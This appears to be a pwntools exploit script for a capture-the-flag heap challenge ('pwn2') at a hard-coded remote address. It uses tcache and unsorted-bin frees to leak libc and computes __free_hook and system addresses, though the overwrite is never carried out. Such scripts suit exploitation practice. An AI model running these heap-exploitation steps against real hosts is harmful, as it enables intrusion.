from pwn import *
from LibcSearcher import *
import sys
remote_addr = ["49.233.15.226",8002]
libc = ELF('./libc-2.31.so')
elf = ELF('./pwn2')
if len(sys.argv) == 1:
    context.log_level="debug" 
    #p = process(["qemu-aarch64", "-L", "/usr/aarch64-linux-gnu/", "-g","1234","./stack"]) 
    #p = process(["qemu-aarch64", "-L", ".", "./stack"]) 
    p = gdb.debug('./pwn2','''
    b menu
    set debug-file-directory ./debug
    ''')
    context(arch='amd64', os='linux')
if len(sys.argv) == 2 :
    if 'r' in sys.argv[1]:
        p = remote(remote_addr[0],remote_addr[1])
    if 'n' not in sys.argv[1]:
        context.log_level="debug" 
        context(arch = 'amd64', os = 'linux')
r = lambda : p.recv()
rl = lambda : p.recvline()
rc = lambda x: p.recv(x)
ru = lambda x: p.recvuntil(x)
rud = lambda x: p.recvuntil(x, drop=True)
s = lambda x: p.send(x)
sl = lambda x: p.sendline(x)
sa = lambda x, y: p.sendafter(x, y)
sla = lambda x, y: p.sendlineafter(x, y)
shell = lambda : p.interactive()
pr = lambda name,x : log.info(name+':'+hex(x))

def add(idx,size,content):
    ru(b'>> ')
    s(b'1')
    ru(b'index\n')
    s(str(idx))
    ru(b'size\n')
    s(str(size))
    ru(b'content\n')
    s(content)

def delete(idx):
    ru(b'>> ')
    s(b'2')
    ru(b'index\n')
    s(str(idx))

def show(idx):
    ru(b'>> ')
    s(b'3')
    ru(b'index\n') 
    s(str(idx))

for i in range(7):
    add(i,0x80,b'a')
add(7,0x80,b'b')
for i in range(7):
    delete(i)

add(8,0x10,b'protected')
delete(7)
add(8,0x40,b'\n')
show(8)

leak_addr = u64(rc(6).ljust(8,b'\x00'))
pr("leak_addr",leak_addr)
libc_base = leak_addr - 0x1ecc0a
pr("libc_base",libc_base)
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']

shell()